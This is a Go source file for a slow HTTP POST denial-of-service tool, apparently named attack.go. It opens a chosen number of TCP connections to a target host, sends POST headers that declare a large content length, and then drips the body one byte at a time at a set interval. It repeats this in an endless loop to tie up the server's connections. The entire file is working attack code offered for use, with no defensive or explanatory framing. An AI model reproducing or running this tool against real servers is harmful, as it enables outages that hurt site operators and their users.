package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strconv"
	"time"
)

func toInt(s string) int {
	i, err := strconv.Atoi(s)
	if err != nil {
		return 0
	}

	return i
}

func main() {
	args := os.Args[1:]

	if len(args) < 6 {
		fmt.Println("Incorrect usage.")
		fmt.Println("go run attack.go <Host> <Port> <Path> <ContentSize> <PostBitInterval> <clients>")
		return
	}

	host := args[0]
	port := toInt(args[1])
	path := args[2]
	contentSize := toInt(args[3])
	postBitInterval := toInt(args[4])
	clients := toInt(args[5])

	conns := make([]net.Conn, clients)
	for i := 0; i < clients; i++ {
		conn, err := net.Dial("tcp", fmt.Sprintf("%v:%v", host, port))
		conns[i] = conn
		if err != nil {
			fmt.Printf("ERROR Opening socket")
		} else {
			fmt.Println("Connection open ", i)
		}
	}

	for {
		for i := 0; i < clients; i++ {
			if conns[i] != nil {
				fmt.Fprintf(conns[i], "POST %v HTTP/1.0\r\n", path)
				fmt.Fprintf(conns[i], "content-type:application/x-www-form-urlencoded;charset=utf-8\r\n")
				fmt.Fprintf(conns[i], "content-length:%v", contentSize)
				fmt.Fprintf(conns[i], "\r\n\r\n")
				fmt.Fprintf(conns[i], "name=")
			}
		}

		fmt.Println()
		for i := 0; i < contentSize-5; i++ {
			for e := 0; e < clients; e++ {
				if conns[e] != nil {
					fmt.Fprintf(conns[e], "%v", e%10)
				}
			}
			time.Sleep(time.Duration(postBitInterval) * time.Millisecond)
			fmt.Printf("\r%v %%", i*100/contentSize)
		}

		fmt.Println()
		for i := 0; i < clients; i++ {

			if conns[i] != nil {
				status, err := bufio.NewReader(conns[i]).ReadString('\n')

				if err != nil {
					fmt.Println(err)
				} else {
					fmt.Printf("%v - %v", i, status)
				}
			}

		}
		fmt.Println("Cycle is done")
	}
}
